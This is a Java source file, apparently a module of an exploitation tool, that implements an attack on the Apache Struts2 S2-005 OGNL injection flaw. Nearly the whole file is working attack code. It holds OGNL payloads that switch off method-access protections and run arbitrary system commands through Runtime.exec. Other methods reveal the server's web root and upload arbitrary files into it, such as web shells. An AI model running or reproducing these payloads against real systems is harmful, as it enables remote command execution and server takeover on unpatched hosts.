package fun.fireline.exp.apache.struts2;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTool;
import java.net.URLEncoder;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/7/6 10:38
 * @github https://github.com/yhy0
 */

public class S2_005 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;

    private static final String PAYLOAD = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'%s\\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))";

    private String webPath = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i97)(('\\43xman.getWriter().println(\\43req.getRealPath(\"\\u005c\"))')(d))&(i99)(('\\43xman.getWriter().close()')(d))";

    @Override
    public boolean checkVUL(String url) {
        String uuid =  UUID.randomUUID().toString();
        this.target = url;
        try {
            String data = String.format(PAYLOAD, "echo " + uuid);
            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", data, "UTF-8");
            boolean flag = result.contains(uuid);
            if(flag) {
                this.isVul = true;
            }
            return flag;
        } catch (Exception e) {
            logger.error(e.getStackTrace());
        }
        return false;
    }

    @Override
    public String exeCMD(String cmd, String encoding) {
        try {
            String data = String.format(PAYLOAD, cmd);
            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", data, encoding);
            return result;

        } catch (Exception e) {
            logger.error(e.getStackTrace());
        }
        return "fail";
    }

    @Override
    public String getWebPath() {
        try {
            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", webPath, "UTF-8");
            return result;

        } catch (Exception e) {
            logger.error(e.getStackTrace());
        }
        return "命令执行失败";
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        String uuid =  UUID.randomUUID().toString();

        fileContent = URLEncoder.encode(fileContent, "UTF-8" );

        String payload = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(%22false%22)))=&(i1)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))=&(i12)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i13)(('\\43xman.getWriter().println(\\43req.getServletContext().getRealPath(%22\\u005c%22))')(d))=&(i2)(('\\43fos\\75new\\40java.io.FileOutputStream(new\\40java.lang.StringBuilder(\\43req.getRealPath(%22\\u005c%22)).append(%22/" + filename + "%22).toString())')(d))=&(i3)(('\\43fos.write(\\43req.getParameter(%22t%22).getBytes())')(d))=&(i4)(('\\43fos.close()')(d))(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i95)(('\\43xman.getWriter().print(\"" + uuid+ "\")')(d))=&(i99)(('\\43xman.getWriter().close()')(d))=&t=" + fileContent;

        String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", payload, "UTF-8");

        if(result.contains(uuid)) {
            result = result + "  上传成功";
        } else {
            result =  "上传失败";
        }

        return result;

    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
